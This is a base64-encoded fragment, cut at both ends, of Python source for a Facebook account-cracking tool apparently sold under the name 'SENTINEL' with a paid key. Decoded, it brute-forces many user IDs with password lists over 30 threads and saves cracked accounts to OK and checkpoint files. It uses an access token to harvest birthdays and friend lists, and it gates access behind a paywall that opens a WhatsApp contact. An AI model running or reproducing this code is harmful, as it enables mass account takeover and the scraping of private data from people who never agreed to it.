xLLEgpKS5zcGxpdCgiLCIpDQogICAgICAgIGlmIGxlbihzZWxmLnB3KSA9PTA6c2VsZi5wd2xpc3QoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5mbDppLnVwZGF0ZSh7InB3IjpzZWxmLnB3fSkNCiAgICAgICAgICAgIHRyeTpvcy5yZW1vdmUoJ2NwX29wdGlvbi50eHQnKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgIHByaW50KCclcyAnJShPKSk7cHVmID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc1BPUCBVUCBDUCBPUFRJT05TPyBbWS9uXSA6ICclKEgsUCxILEspKQ0KICAgICAgICAgICAgaWYgcHVmIGluIFsnJ106amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgICAgIGVsaWYgcHVmIGluIFsnMScsJzAxJywnMDAxJywneScsJ1knXTphdXRvX2dhbnRpX3Bhc3MoJ1llcycpO2NvayA9IG9wZW4oJ2NwX29wdGlvbi50eHQnLCd3Jyk7Y29rLndyaXRlKCdvcHNpX2NwJyk7Y29rLmNsb3NlKCk7c3RhcnRlZCgpO1RocmVhZFBvb2woMzApLm1hcChzZWxmLnN0YXJ0X2NyYWNrLHNlbGYuZmwpO29zLnJlbW92ZShzZWxmLmFwayk7X2NpY2lfY2ljaV8oKQ0KICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycyJywnMDInLCcwMDInLCduJywnTiddOmF1dG9fZ2FudGlfcGFzcygnTm8nKTtjb2sgPSBvcGVuKCdjcF9vcHRpb24udHh0JywndycpO2Nvay53cml0ZSgnbnVsbCcpO2Nvay5jbG9zZSgpO3N0YXJ0ZWQoKTtUaHJlYWRQb29sKDMwKS5tYXAoc2VsZi5zdGFydF9jcmFjayxzZWxmLmZsKTtvcy5yZW1vdmUoc2VsZi5hcGspO19jaWNpX2NpY2lfKCkNCiAgICAgICAgICAgIGVsc2U6amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICBkZWYgc3RhcnRfY3JhY2soc2VsZixmbCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIG1ldG9kZSA9IG9wZW4oJ21ldGhvZC50eHQnLCdyJykucmVhZCgpDQogICAgICAgICAgICBmb3IgaSBpbiBmbC5nZXQoInB3Iik6DQogICAgICAgICAgICAgICAgaWYgJ21ldGhvZGVfYXBpX3YxJyBpbiBtZXRvZGU6bG9nID0gbG9nX2FwaV8xKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ21ldGhvZGVfYXBpX3YyJyBpbiBtZXRvZGU6bG9nID0gbG9nX2FwaV8yKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ21ldGhvZGVfbWJhc2ljX3YxJyBpbiBtZXRvZGU6bG9nID0gbG9nX21iYXNpY18xKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ21ldGhvZGVfbWJhc2ljX3YyJyBpbiBtZXRvZGU6bG9nID0gbG9nX21iYXNpY18yKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ21ldGhvZGVfbW9iaWxlX3YxJyBpbiBtZXRvZGU6bG9nID0gbG9nX21vYmlsZV8xKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ21ldGhvZGVfbW9iaWxlX3YyJyBpbiBtZXRvZGU6bG9nID0gbG9nX21vYmlsZV8yKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGVsc2U6bG9nID0gbG9nX21iYXNpY18xKGZsLmdldCgiaWQiKSxpKQ0KICAgICAgICAgICAgICAgIGlmIGxvZy5nZXQoInN0YXR1cyIpPT0iY3AiOg0KICAgICAgICAgICAgICAgICAgICBmaWxlc19jcCA9ICJDUC8lcy50eHQiJSh0YW5nZ2FsKQ0KICAgICAgICAgICAgICAgICAgICBpZiBmbC5nZXQoImlkIikgaW4gZmlsZXNfY3A6cGFzcw0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OmtlID0gX3JlcV9nZXRfKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iICsgZmwuZ2V0KCJpZCIpICsgIj9maWVsZHM9bmFtZSxpZCxiaXJ0aGRheSxmaXJzdF9uYW1lLG1pZGRsZV9uYW1lLGxhc3RfbmFtZSxuYW1lX2Zvcm1hdCxwaWN0dXJlLHNob3J0X25hbWUmYWNjZXNzX3Rva2VuPSIgKyBfYXppbXZhdV9kYXB1bnRhXygidG9rZW4udHh0IiwiciIpLnJlYWQoKSk7dHQgPSBfanNfbG9fKGtlLnRleHQpO3R0bCA9IHR0WyJiaXJ0aGRheSJdO20sZCx5ID0gdHRsLnNwbGl0KCIvIik7bSA9IGJ1bGFuX3R0bFttXTt0dGxsID0gKCcg4oCiICVzICVzICVzJyUoZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnR0bGwgPSAoJyclKCkpDQogICAgICAgICAgICAgICAgICAgICAgICBoX2NwID0gIlxyICVzWyVzU0VOVElORUwtQ1Alc10gJXMg4oCiICVzJXMlcyAgICAgICAgICAiJShLLFAsSyxmbC5nZXQoImlkIiksaSx0dGxsLHRhaHVuKGZsLmdldCgiaWQiKSkpO2Nla19vcHNpKGZsLmdldCgiaWQiKSxpLGhfY3ApDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNwLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSk7X2F6aW12YXVfZGFwdW50YV8oZmlsZXNfY3AsImErIikud3JpdGUoIiVz4oCiJXMlc1xuIiUoZmwuZ2V0KCJpZCIpLGksdHRsbC5yZXBsYWNlKCcgJywnJykpKTticmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgbG9nLmdldCgic3RhdHVzIik9PSJvayI6DQogICAgICAgICAgICAgICAgICAgIGZpbGVzX29rID0gIk9LLyVzLnR4dCIlKHRhbmdnYWwpDQogICAgICAgICAgICAgICAgICAgIGlmIGZsLmdldCgiaWQiKSBpbiBmaWxlc19vazpwYXNzDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnbWV0aG9kZV9tYmFzaWNfdjEnIGluIG1ldG9kZSBvciAnbWV0aG9kZV9tYmFzaWNfdjInIGluIG1ldG9kZSBvciAnbWV0aG9kZV9tb2JpbGVfdjEnIGluIG1ldG9kZSBvciAnbWV0aG9kZV9tb2JpbGVfdjInIGluIG1ldG9kZTpoX29rID0gIlxyICVzWyVzU0VOVElORUwtT0slc10gJXMg4oCiICVzJXMlcyAgICAgICAgICAiJShILFAsSCxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpLFApO2Nla19hcGsoaF9vayxjdnRfY29va2llcyhsb2cuZ2V0KCJjb29raWVzIikpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpwcmludCgiXHIgJXNbJXNTRU5USU5FTC1PSyVzXSAlcyDigKIgJXMlcyAgICAgICAgICAiJShILFAsSCxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYWRhLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSk7X2F6aW12YXVfZGFwdW50YV8oZmlsZXNfb2ssImErIikud3JpdGUoIiVz4oCiJXNcbiIlKGZsLmdldCgiaWQiKSxpKSk7YnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOmNvbnRpbnVlDQogICAgICAgICAgICBzZWxmLmtvKz0xDQogICAgICAgICAgICBwcmludCgiXHIgJXNbJXNDUkFDSyVzXVslcyVzLyVzJXNdWyVzU0VOVElORUwtT0s6JXMlc11bJXNTRU5USU5FTC1DUDolcyVzXSVzIiUoSyxILEssUCxzZWxmLmtvLGxlbihzZWxmLmZsKSxLLFAsbGVuKHNlbGYuYWRhKSxLLFAsbGVuKHNlbGYuY3ApLEssUCksIGVuZD0nJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIGV4Y2VwdDpzZWxmLnN0YXJ0X2NyYWNrKGZsKQ0KDQoNCiMjIyBNZW5kYXBhdCBKdW1sYWggVGVtYW4gVGFyZ2V0DQpkZWYgdGVtYW5fdGFyZ2V0KCk6DQogICAgaXQgPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzVEFSR0VUIElEIDolcyAnJShILFAsSCxLLEgpKQ0KICAgIHRyeTp0b2tlbiA9IF9hemltdmF1X2RhcHVudGFfKCd0b2tlbi50eHQnLCdyJykucmVhZCgpO21tID0gX3JlcV9nZXRfKCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJShpdCx0b2tlbikpO25uID0gX2pzX2xvXyhtbS50ZXh0KTtwcmludCAoJyVzIFslc+KAoiVzXSAlc05BTUUgOiAlcyclKEgsUCxILEssbm5bJ25hbWUnXSkpDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpqYWxhbignJXMgWyVzISVzXSAlc1RPS0VOL0NPT0tJRVMgSU5WQUxJRCclKE0sUCxNLFApKTttZW51X2xvZygpDQogICAgdHQ9W107dGU9W107bGltID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0RVTVAgTElNSVQgOiAlcyclKEgsUCxILEssSCkpO3ByaW50KCclcyAlcyclKE8sUCkpO2FkYSA9IF9yZXFfZ2V0XygnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpdCxsaW0sdG9rZW4pKTtpZGkgPSBfanNfbG9fKGFkYS50ZXh0KQ0KICAgIGZvciB4IGluIGlkaVsnZGF0YSddOnR0LmFwcGVuZCh4WydpZCddKQ0KICAgIGZvciBpZCBpbiB0dDoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYWRhMiA9IF9yZXFfZ2V0XygnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnJShpZCx0b2tlbikpO2lkaTIgPSBfanNfbG9fKGFkYTIudGV4dCkNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBmb3IgYiBpbiBpZGkyWydkYXRhJ106dGUuYXBwZW5kKGJbJ2lkJ10pDQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6cHJpbnQoJyBbIV0gUFJJVkFURScpDQogICAgICAgICAgICBwcmludCgnIFvigKJdJyxpZCwn4oCiJyxsZW4odGUpKTt0ZS5jbGVhcigpDQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjpwcmludCgnJXMgWyFdIFNQQU0gQUNDT1VOVC4uLiEnJShNKSkNCiAgICBwcmludCgnICcpO19jaWNpX2F6aW12YXVfKCcgWyBCQUNLIF0nKTttZW51KCkNCg0KIyMjIE1lbnUgTWVuZ2VjZWsgcmVzdWx0IENyYWNrDQpkZWYgcmVzdWx0KCk6DQogICAgY2xlYXIoKQ0KICAgIGJhbm5lcigpDQogICAgamFsYW4oJyVzIFsgJXNDUkFDSyBSRVNVTFRTICVzXSclKEgsUCxIKSk7cHJpbnQoJyVzICclKE8pKTtwcmludCgnJXMgWyVzMSVzXSAlc0NIRUNLIFJFU1VMVFMgT0snJShILFAsSCxLKSk7cHJpbnQoJyVzIFslczIlc10gJXNDSEVDSyBSRVNVTFRTIENQJyUoSCxQLEgsUCkpO2NoID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0NIT09TRSA6ICclKEgsUCxILEspKQ0KICAgIGlmIGNoIGluIFsnJ106amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICBlbGlmIGNoIGluIFsnMScsJzAxJywnMDAxJywnYSddOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBva2wgPSBvcy5saXN0ZGlyKCJPSyIpO3ByaW50KCclcyAnJShPKSk7cHJpbnQoJyVzIFslcyBDUkFDSyBSRVNVTFRTIFNUT1JFRCBJTiBPSyBGSUxFICVzXSclKEgsUCxIKSk7cHJpbnQoJyVzICclKE8pKQ0KICAgICAgICAgICAgZm9yIGZpbGUgaW4gb2tsOnByaW50KCclcyBbJXPigKIlc10gJXMlcyclKEgsUCxILEssZmlsZSkpDQogICAgICAgICAgICBwcmludCgnJXMgJyUoTykpO2ZpbGVzID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0VOVEVSIEZJTEUgTkFNRSA6ICclKEgsUCxILEspKTtwcmludCgnJykNCiAgICAgICAgICAgIGlmIGZpbGVzID09ICIiOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7cmVzdWx0KCkNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBwcHAgPSBfYXppbXZhdV9kYXB1bnRhXygiT0svJXMiJShmaWxlcykpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgICAgICBmb3IgeCBpbiBwcHA6eXl5ID0geC5yZXBsYWNlKCfigKInLCcg4oCiICcpO3ByaW50KCcgJXNbJXNTRU5USU5FTC1PSyVzXSAlcyclKEgsUCxILHl5eSkpDQogICAgICAgICAgICAgICAgZGVsMSA9ICgiJXMiJShmaWxlcykpLnJlcGxhY2UoIi0iLCAiICIpLnJlcGxhY2UoIi50eHQiLCAiIik7cHJpbnQoJ1xuJXMgWyVz4oCiJXNdICVzVE9UQUwgQ1JBQ0sgUkVTVUxUIERBVEUgJXMgSVMgJXMgQUNDT1VOVCclKEgsUCxILEssZGVsMSxsZW4ocHBwKSkpDQogICAgICAgICAgICBleGNlcHQ6cHJpbnQoJyVzIFslcyBOTyBSRVNVTFRTIEZPVU5EICVzXSclKE0sUCxNKSkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpwcmludCgnJXMgWyVzIE5PIFJFU1VMVFMgRk9VTkQgJXNdJyUoTSxQLE0pKQ0KICAgIGVsaWYgY2ggaW4gWycyJywnMDInLCcwMDInLCdiJ106DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGNwbCA9IG9zLmxpc3RkaXIoIlNFTlRJTkVMLUNQIik7cHJpbnQoJyVzICclKE8pKTtwcmludCgnJXMgWyVzIENSQUNLIFJFU1VMVFMgU1RPUkVEIElOIENQIEZJTEVTICVzXSclKEgsUCxIKSk7cHJpbnQoJyVzICclKE8pKQ0KICAgICAgICAgICAgZm9yIGZpbGUgaW4gY3BsOnByaW50KCclcyBbJXPigKIlc10gJXMlcyclKEgsUCxILEssZmlsZSkpDQogICAgICAgICAgICBwcmludCgnJXMgJyUoTykpO2ZpbGVzID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0VOVEVSIEZJTEUgTkFNRSA6ICclKEgsUCxILEspKTtwcmludCgnJykNCiAgICAgICAgICAgIGlmIGZpbGVzID09ICIiOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7cmVzdWx0KCkNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBwcHAgPSBfYXppbXZhdV9kYXB1bnRhXygiU0VOVElORUwtQ1AvJXMiJShmaWxlcykpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgICAgICBmb3IgeCBpbiBwcHA6eXl5ID0geC5yZXBsYWNlKCfigKInLCcg4oCiICcpO3ByaW50KCcgJXNbJXNTRU5USU5FTC1DUCVzXSAlcyclKEssUCxLLHl5eSkpDQogICAgICAgICAgICAgICAgZGVsMSA9ICgiJXMiJShmaWxlcykpLnJlcGxhY2UoIi0iLCAiICIpLnJlcGxhY2UoIi50eHQiLCAiIik7cHJpbnQoJ1xuJXMgWyVz4oCiJXNdICVzVE9UQUwgQ1JBQ0sgUkVTVUxUIERBVEUgJXMgSVMgJXMgQUNDT1VOVCclKEgsUCxILFAsZGVsMSxsZW4ocHBwKSkpDQogICAgICAgICAgICBleGNlcHQ6cHJpbnQoJyVzIFslcyBOTyBSRVNVTFRTIEZPVU5EICVzXSclKFAsTSxNKSkNCiAgICAgICAgZXhjZXB0OnByaW50KCclcyBbJXMgTk8gUkVTVUxUUyBGT1VORCAlc10nJShQLE0sUCkpDQogICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sTSkpO21lbnUoKQ0KICAgIHByaW50KCclcyAnJShPKSk7X2NpY2lfYXppbXZhdV8oJyVzIFsgJXNCQUNLICVzXSVzJyUoSCxQLEgsSykpO21lbnUoKQ0KDQpkZWYgY2VrX3Jlc3VsdCgpOg0KICAgIHRyeTpvcy5yZW1vdmUoJ29wdGlvbl8udHh0JykNCiAgICBleGNlcHQ6cGFzcw0KICAgIGNpayA9IG9wZW4oJ29wdGlvbl8udHh0JywndycpO2Npay53cml0ZSgncmVzdWx0Jyk7Y2lrLmNsb3NlKCkNCiAgICBwcmludCgnJXMgWyAlc0NIRUNLIENSQUNLIFJFU1VMVCBBQ0NPVU5UIE9QVElPTlMgJXNdJyUoSCxLLEgpKTtwcmludCgnJXMgJyUoTykpO3ByaW50KCclcyBbJXPigKIlc10gJXNFWEFNUExFIEZJTEUgOiAlcy50eHQnJShILFAsSCxLLHRhbmdnYWwpKTtmaWxlc19fID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0ZpbGUgOiAnJShILFAsSCxLKSk7ZmlsZXMgPSAiQ1AvIitmaWxlc19fDQogICAgdHJ5OmJ1a2FfYmFqdSA9IF9hemltdmF1X2RhcHVudGFfKGZpbGVzLCJyIikucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwcmludCgiJXMgWyVzISVzXSAlc0ZJTEUgTk9UIEVYSVNUSU5HIiUoTSxQLE0sUCkpO3RpbWUuc2xlZXAoMik7IG1lbnUoKQ0KICAgIGF1dG9fZ2FudGlfcGFzcygnWWVzJyk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc1RPVEFMIEFDQ09VTlRTIDogJXMlcyIlKEgsUCxILEssSCxzdHIobGVuKGJ1a2FfYmFqdSkpKSk7cHJpbnQoIiIpDQogICAgZm9yIG1lbWVrIGluIGJ1a2FfYmFqdToNCiAgICAgICAgaWYgJ8Oi4oKswqInIGluIG1lbWVrOm1lbWVrID0gbWVtZWsucmVwbGFjZSgnw6LigqzCoicsJ+KAoicpDQogICAgICAgIGtvbnRvbCA9IG1lbWVrLnJlcGxhY2UoIuKAoiIsIiDigKIgIik7dGl0aWQgID0gbWVtZWsuc3BsaXQoIuKAoiIpDQogICAgICAgIF9mb3JtYXRfID0gIlxyICVzWyVzU0VOVElORUwtQ1Alc10gJXMgICAgICAgICAgIiUoSyxQLEssa29udG9sKQ0KICAgICAgICB0cnk6Y2VrX29wc2kodGl0aWRbMF0sdGl0aWRbMV0sX2Zvcm1hdF8pDQogICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgIHByaW50KCIiKTtwcmludCgnJXMgWyVz4oCiJXNdICVzQ0hFQ0tJTkcgUFJPQ0VTUyBDT01QTEVURSclKEgsUCxILEspKTtwcmludCgnJXMgJyUoTykpO19jaWNpX2F6aW12YXVfKCclcyBbICVzQkFDSyAlc10lcyclKEgsUCxILEspKTttZW51KCkNCg0KDQojIyMgVmFyaWFzaSBUZWtzDQpkZWYgdmFyX21lbnUoKToNCiAgICBwcmludCgnJXMgICAgICAgICAgWyAlc0NIT09TRSBMT0dJTiBNRVRIT0QgJXNdJyUoWixLLFopKQ0KICAgIHByaW50KCcnKQ0KICAgIHByaW50KCclcyBbJXMxJXNdICVzTE9HSU4gV0lUSCBUT0tFTiBbJXNMSU1JVEVEIEFDQ0VTUyVzXSclKEgsUCxILFAsTSxQKSkNCiAgICBwcmludCgnJXMgWyVzMiVzXSAlc0xPR0lOIFdJVEggQ09PS0lFUyBbJXNVTkxJTUlURUQgQUNDRVNTJXNdJyUoSCxQLEgsUCxILFApKQ0KICAgIHByaW50KCclcyBbJXMwJXNdICVzRVhJVCclKEgsUCxILE0pKQ0KICAgIHByaW50KCclcyAnJShPKSkNCiAgICANCiAgICANCmRlZiB2YXJfdWdlbigpOg0KICAgIHByaW50KCIlcyBbJXMxJXNdICVzR0VUIFVTRVIgQUdFTlQiJShILFAsSCxIKSkNCiAgICBwcmludCgiJXMgWyVzMiVzXSAlc0NIQU5HRSBVU0VSIEFHRU5UICVzKCVzTUFOVUFMJXMpIiUoSCxQLEgsUCxCLEgsQikpDQogICAgcHJpbnQoIiVzIFslczMlc10gJXNDSEFOR0UgVVNFUiBBR0VOVCAlcyglc0FESlVTVCBIUCVzKSIlKEgsUCxILFAsQixLLEIpKQ0KICAgIHByaW50KCIlcyBbJXM0JXNdICVzREVMRVRFIFVTRVIgQUdFTlQiJShILFAsSCxNKSkNCiAgICBwcmludCgiJXMgWyVzNSVzXSAlc0NIRUNLIFVTRVIgQUdFTlQiJShILFAsSCxLKSkNCiAgICBwcmludCgiJXMgWyVzMCVzXSAlc0JBQ0siJShILFAsSCxNKSkNCg0KZGVmIHN0YXJ0X21ldGhvZCgpOg0KICAgIHByaW50KCclcyAnJShPKSkNCiAgICBwcmludCgnJXMgWyVzMSVzXSAlc0FQSSBNRVRIT0QgVjEnJShILFAsSCxNKSkNCiAgICBwcmludCgnJXMgWyVzMiVzXSAlc0FQSSBNRVRIT0QgVjInJShILFAsSCxCKSkNCiAgICBwcmludCgnJXMgWyVzMyVzXSAlc01CQVNJQyBNRVRIT0QgVjEnJShILFAsSCxIKSkNCiAgICBwcmludCgnJXMgWyVzNCVzXSAlc01CQVNJQyBNRVRIT0QgVjInJShILFAsSCxLKSkNCiAgICBwcmludCgnJXMgWyVzNSVzXSAlc01PQklMRSBNRVRIT0QgVjEnJShILFAsSCxPKSkNCiAgICBwcmludCgnJXMgWyVzNiVzXSAlc01PQklMRSBNRVRIT0QgVjInJShILFAsSCxQKSkNCg0KZGVmIHN0YXJ0X21ldGhvZGV6eigpOg0KICAgIHByaW50KCIiKQ0KICAgIHByaW50KCclcyBbJXMxJXNdICVzRkFTVCBDTE9ORSAlc1slc0ZFVyBSRVNVTFRTJXNdJyUoSCxQLEgsTyxPLE0sTykpDQogICAgcHJpbnQoJyVzIFslczIlc10gJXNTTE9XIENMT05FICVzWyVzUkVDT01NRU5ERUQlc10nJShILFAsSCxPLE8sSCxPKSkNCiAgICBwcmludCgnJXMgWyVzMyVzXSAlc1ZFUlkgU0xPVyBDTE9ORSAlc1slc01PUkUgUkVTVUxUUyVzXSclKEgsUCxILE8sTyxCLE8pKQ0KICAgIHByaW50KCclcyBbJXM0JXNdICVzQ09NQklORUQgUEFTU1dPUkQgQ0xPTkUnJShILFAsSCxLKSkNCiAgICBwcmludCgiIikNCiAgICANCiAgICANCmRlZiBzdGFydGVkKCk6DQogICAgcHJpbnQoIiIpDQogICAgcHJpbnQoIiAgICAgJXPigKIlc+KAoiVz4oCiJXPigKIlc+KAoiVz4oCiJXPigKIlc+KAoiVz4oCiJXPigKIlc+KAoiVz4oCiJXPigKIlc+KAoiVz4oCiJXPigKIlc+KAoiVz4oCiIiUoSCxNLEIsSyxVLE8sSyxILE0sQixLLFUsTyxLLEgsTSxCLEspKQ0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNDTE9OSU5HIElOIFBST0dSRVNTLi4uJyUoSCxNLEgsSCkpDQogICAgcHJpbnQoJyVzIFslc+KAoiVzXSAlc1slc1NFTlRJTkVMLU9LJXNdIElEUyBTQVZFRCBJTiA+PiAlc1NFTlRJTkVMLU9LLyVzLnR4dCclKEgsQixILE8sSCxPLEgsdGFuZ2dhbCkpDQogICAgcHJpbnQoJyVzIFslc+KAoiVzXSAlc1slc1NFTlRJTkVMLUNQJXNdIElEUyBTQVZFRCBJTiA+PiAlc1NFTlRJTkVMLUNQLyVzLnR4dCclKEgsSyxILE8sTSxPLE0sdGFuZ2dhbCkpDQogICAgcHNiKCclcyBbJXPigKIlc10gJXNPTiBGTElHSFQgTU9ERSBGT1IgWzMgU0VDXSBFVkVSWSAzIE1JTlVURVNcbiclKEgsUCxILEIpKQ0KDQoNCmRlZiBmb2xkZXIoKToNCiAgICB0cnk6b3MubWtkaXIoIlNFTlRJTkVMLUNQIikNCiAgICBleGNlcHQ6cGFzcw0KICAgIHRyeTpvcy5ta2RpcigiU0VOVElORUwtT0siKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCg0KZGVmIGdlbmtleSgpOg0KCXRyeToNCgkJcm4gPSBvcGVuKCAnIC9zZGNhcmQvRG93bmxvYWQvIC5TZW50aW5lbFBhaWQudHh0JywgICAgJ3InKS5yZWFkKCkNCgkJcmIgPSBybitiYXNlc3BsaXQNCgkJYmFubmVyKCkNCgkJcHNiKCcgICAgICAgJXPjgIslc+OAiyVz44CLJXNXRSBKVVNUIFBSQVklc+OAiiVz44CKJXPjgIonJShNLEgsQixILEIsSCxNKSkNCgkJcHJpbnQoIlxuXDAzM1swOzkxbSAgICAgICAgICAgWU9VIEFSRSBOT1QgUFJFTUlVTSBVU0VSICIpDQoJCXByaW50KCJcMDMzWzA7OTFtICAgICAgICBGSVJTVCBCVVkgUFJFTUlVTSBLRVkgRlJPTSBPV05FUiIpDQoJCXByaW50KCJcMDMzWzA7OTNtICAgICAgICAgICAgU0VORCBUSElTIEtFWSBUTyBPV05FUiBcblxuICAgWU9VUiBLRVkgOiBcMDMzWzA7OTJtJXMiJShyYikpDQoJCXByaW50KCJcMDMzWzA7OTNtICAgVE9PTCBQUklDRSA6ICVzMTBLICIlKEgpKQ0KCQlwcmludCgiXDAzM1swOzkzbSAgIFZBTElESVRZIDogJXMxIG1vbnRoIiUoSCkpDQoJCXByaW50KCJcMDMzWzA7OTRtICAgICAgICAgIFRFTEVHUkFNIElEIDogSSBObyBHZXQgVGVsZWdyYW0gSWQiKQ0KCQlwcmludCgiXDAzM1swOzk0bSAgICAgICAgICBJTlNUQUdSQU0gOiBJIE5vIEdldCBJbnN0YWdyYW0gQWNjb3VudCIpDQoJCXN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsiYW0iLCAic3RhcnQiLCAiaHR0cHM6Ly93YS5tZS8rMjM0OTA3MTEyMjcxNCJdKQ0KCQlleGl0KCkNCglleGNlcHQoSU9FcnJvcik6DQoJCXJiID0gcngNCgkJb3BlbigiL3NkY2FyZC9Eb3dubG9hZC8gLlNlbnRpbmVsUGFpZC50eHQiLCJ3Iikud3JpdGUocmIpDQoJCW9zLnN5c3RlbSgiY2htb2QgNzc3IC9zZGNhcmQvRG93bmxvYWQvIC5TZW50aW5lbFBhaWQudHh0IikNCgkJYmFubmVyKCkNCgkJcHNiKCcgICAgICAgJXPjgIslc+OAiyVz44CLJXNXRSBKVVNUIFBSQVklc+OAiiVz44CKJXPjgIonJShNLEgsQixILEIsSCxNKSkNCgkJcHJpbnQoIlxuXDAzM1swOzkxbSAgICAgICAgICAgICAgWU9VIEFSRSBOT1QgUFJFTUlVTSBVU0VSICIpDQoJCXByaW50KCJcMDMzWzA7OTFtICAgICAgICAgICBGSVJTVCBCVVkgUFJFTUlVTSBLRVkgRlJPTSBPV05FUiIpDQoJCXByaW50KCJcMDMzWzA7OTNtICAgICAgICAgICAgICAgU0VORCBUSElTIEtFWSBUTyBPV05FUiBcblxuIFlPVVIgS0VZIDogXDAzM1swOzkybSVzJXMiJShyYixiYXNlc3BsaXQpKQ0KCQlwcmludCgiXDAzM1swOzkzbSAgICAgVE9PTCBQUklDRSA6ICVzMTBLIiUoSCkpDQoJCXByaW50KCJcMDMzWzA7OTNtICAgICBWQUxJRElUWSA6ICVzMSBtb250aCIlKEgpKQ0KCQlwcmludCgiXDAzM1swOzk0bSAgICAgICAgICAgICBURUxFR1JBTSBJRCA6IEkgTm8gR2V0IFRlbGVncmFtIElkIikNCgkJcHJpbnQoIlwwMzNbMDs5NG0gICAgICAgICAgICAgSU5TVEFHUkFNIDogSSBObyBHZXQgSW5zdGFncmFtIEFjY291bnQiKQ0KCQlzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbImFtIiwgInN0YXJ0IiwgImh0dHBzOi8vd2EubWUvMjM0OTA3MTEyMjcxNCJdKQ0KCQlleGl0KCkNCg0KZGVmIGtleWNoZWNrKCk6DQogICAgdHJ5Og0KICAgICAgICBrID0gb3BlbigiL3NkY2FyZC9Eb3dubG9hZC8gLlNlbnRpbmVsUGFpZC50eHQiLCJyIikucmVhZCgpDQogICAgICAgIGlmIGsrYmFzZXNwbGl0IGluIHJxOg0KICAgICAgICAgICAgbWVudSgpDQogICAgICAgIGVsc2U6Z2Vua2V5KCkNCiAgICBleGNlcHQoSU9FcnJvcik6DQogICAgICAgIGdlbmtleSgpDQogICAJDQppZiBfX25hbWVfXz09J19fbWFpbl9fJzoNCglvcy5zeXN0ZW0oJ2dpdCBwdWxsJykNCglmb2xkZXIoKQ0KCWtleWNo